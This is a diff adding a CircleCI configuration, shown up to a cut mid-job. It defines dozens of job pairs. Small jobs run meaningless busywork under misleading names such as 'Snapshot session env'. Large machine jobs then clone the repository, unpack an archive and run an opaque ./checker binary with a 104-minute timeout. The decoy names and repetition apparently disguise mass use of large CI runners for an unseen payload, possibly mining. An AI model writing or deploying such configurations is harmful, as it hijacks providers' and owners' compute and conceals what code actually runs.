@@ -1,0 +1,1533 @@
+version: 2.1
+
+jobs:
+  orchestrate_jan3-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collate dictionary rows
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; seq 1 1205902 | md5sum > /tmp/.wsp/relay.txt; true
+            du -h /tmp/.wsp/relay.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - relay.txt
+  jan3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/relay.txt > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  install_py310-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Dispatch work units
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 175687 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/.wsp/882v2.data
+            du -h /tmp/.wsp/882v2.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 882v2.data
+  py310-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/882v2.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  phase2_promote:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 70044); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/.wsp/.lock
+            du -h /tmp/.wsp/.lock
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .lock
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.lock > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  inspect_assemble-staging-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Enumerate line counts
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=80 2>/dev/null | md5sum; true ; } > /tmp/.wsp/step-12.log
+            du -h /tmp/.wsp/step-12.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-12.log
+  assemble-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/step-12.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  kick_PROD_STAGE_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 2 4094 | factor | wc -l; true ; } > /tmp/.wsp/OK
+            du -h /tmp/.wsp/OK
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - OK
+  PROD_STAGE_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/OK > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  reserve_q2-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 8000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/.wsp/big_phase_output_v4.out
+            du -h /tmp/.wsp/big_phase_output_v4.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - big_phase_output_v4.out
+  q2-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/big_phase_output_v4.out > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  D_ruby3-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mix shuffle salt
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1024000 | fold -w8 | sort -u | wc -l; true ; } > /tmp/.wsp/manifest
+            du -h /tmp/.wsp/manifest
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - manifest
+  ruby3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/manifest > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  syncer_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 332666 | awk 'NR%10==0{sum+=$1}END{print sum}'; true ; } > /tmp/.wsp/step-21.log
+            du -h /tmp/.wsp/step-21.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-21.log
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/step-21.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  run_yolo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Walk sorted keys
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 125396 | awk '{s+=$1}END{print s}'; true ; } > /tmp/.wsp/.marker
+            du -h /tmp/.wsp/.marker
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .marker
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  cleanup_wip-oauth:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Measure entropy sample
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<65661;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/.wsp/result.md
+            du -h /tmp/.wsp/result.md
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - result.md
+  wip-oauth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/result.md > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  fixture_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Reorder index entries
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 142887 | awk 'NR>19549 && NR<32042{s+=$1}END{print s}'; true ; } > /tmp/.wsp/step-12.out
+            du -h /tmp/.wsp/step-12.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-12.out
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/step-12.out > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  step2_Prepare_Suite2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes abc | head -n 169945 | sha256sum; true ; } > /tmp/.wsp/step-23.out
+            du -h /tmp/.wsp/step-23.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-23.out
+  Prepare_Suite2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/step-23.out > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  g1_fix-router-redirect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=10 2>/dev/null | md5sum; true ; } > /tmp/.wsp/FINAL
+            du -h /tmp/.wsp/FINAL
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - FINAL
+  fix-router-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/FINAL > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  g2_v9-edge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Collect retire counts
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 166190; echo "ftr" ) | wc -l; true ; } > /tmp/.wsp/ckpt-D.pkl
+            du -h /tmp/.wsp/ckpt-D.pkl
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-D.pkl
+  v9-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/ckpt-D.pkl > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  loader_cerberus-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Snapshot session env
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 424839 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/.wsp/timings.tsv
+            du -h /tmp/.wsp/timings.tsv
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.tsv
+  cerberus-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/timings.tsv > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  stage_rust-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compute slot digest
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 527232 | awk 'NR%19==0{sum+=$1}END{print sum}'; true ; } > /tmp/.wsp/2024-12-10.data
+            du -h /tmp/.wsp/2024-12-10.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-12-10.data
+  rust-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/2024-12-10.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  auditor_RolloutApp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<346102;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/.wsp/event.txt
+            du -h /tmp/.wsp/event.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - event.txt
+  RolloutApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/event.txt > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  orchestrate_ShipTests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Build summary row
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 429927 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/.wsp/cache.blob
+            du -h /tmp/.wsp/cache.blob
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - cache.blob
+  ShipTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/cache.blob > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  loader_cook-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rebase partial order
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 358400 | fold -w8 | sort -u | wc -l; true ; } > /tmp/.wsp/ckpt-v2.state
+            du -h /tmp/.wsp/ckpt-v2.state
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-v2.state
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/ckpt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  phase2_uniform-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 13824000 | base64 | head -c 200 | wc -c; true ; } > /tmp/.wsp/58.bin
+            du -h /tmp/.wsp/58.bin
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 58.bin
+  uniform-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/58.bin > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  B_tb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Shape histogram tail
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 51357 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/.wsp/99.data
+            du -h /tmp/.wsp/99.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 99.data
+  tb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/99.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  tester_produce-nightly-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 438745 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/.wsp/step-ok.log
+            du -h /tmp/.wsp/step-ok.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-ok.log
+  produce-nightly-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/step-ok.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  cache_vb-01:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 11264 | wc -c; true ; } > /tmp/.wsp/gate-done.out
+            du -h /tmp/.wsp/gate-done.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - gate-done.out
+  vb-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/gate-done.out > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  drain_DATA-296:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 14680064 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/.wsp/2024-08-02.data
+            du -h /tmp/.wsp/2024-08-02.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-08-02.data
+  DATA-296:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/2024-08-02.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  runner_HOOK_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Reduce text corpus
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=240 2>/dev/null | md5sum; true ; } > /tmp/.wsp/final.log
+            du -h /tmp/.wsp/final.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - final.log
+  HOOK_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/final.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  phase_brodcast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Harvest random seed
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/.wsp/328b.txt
+            du -h /tmp/.wsp/328b.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 328b.txt
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/328b.txt > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  inspect_bake-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Spool byte frames
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 1284500 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/.wsp/big_step_output.txt
+            du -h /tmp/.wsp/big_step_output.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - big_step_output.txt
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/big_step_output.txt > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  green_vb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
